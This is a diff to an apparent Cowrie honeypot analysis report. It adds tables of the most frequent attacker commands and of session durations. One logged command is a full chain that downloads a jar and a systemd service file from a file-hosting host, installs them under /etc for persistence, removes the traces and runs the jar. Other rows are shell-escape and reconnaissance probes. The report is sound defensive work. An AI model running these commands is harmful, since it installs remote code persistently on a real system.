@@ -72,9 +72,40 @@
 - **Failed (cowrie.login.falied):** 30,073 (44.2%)
 
 ## Most Common Commands
+* overall 3,346 logs with commands 
 
-*To be filled*
+| Command | Count |
+|---------|-------|
+| uname -s -v -n -r -m | 600 |
+| sh | 254 |
+| shell | 253 |
+| enable | 249 |
+| system | 248 |
+| wget https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb && curl -sSL -o Stream.jar https://www.zippyshare.day/download/Ee1rqDBD1Rb7F5n/EQN9mEYX4m6dW/Stream.jar && chmod +x Stream.jar && sudo cp Stream.jar /etc/ && sudo dpkg -i jdk-21_linux-x64_bin.deb && curl -sSL -o streamer.service https://www.zippyshare.day/download/XxGCIBDG6UnYsBw/DM2BGwwJkGj40/streamer.service && sudo cp streamer.service /etc/systemd/system/ && sudo systemctl enable streamer.service && rm Stream.jar && rm streamer.service && rm jdk-21_linux-x64_bin.deb && java -jar /etc/Stream.jar | 181 |
+| /bin/busybox cat /proc/self/exe || cat /proc/self/exe | 178 |
+| kill %%1 | 143 |
+| ping;sh | 143 |
+| uname -a | 75 |
+
+
 
 ## Session Durations
 
-*To be filled*
+### Top 3 longest sessions
+
+| Duration | count | 
+|---------|-------|
+| 201.97 sec | 1 |
+| 191.43 sec | 1 |
+| 189.75 sec | 1 |
+
+### Top 3 shortest sessions
+
+| Duration | count | 
+|---------|-------|
+| 0.0002592  sec | 1 |
+| 0.0002639 sec | 1 |
+| 0.0002703 sec | 1 |
+
+- Average duration **7.3686 sec.**
+- Count cowrie.session.closed = **67,645**
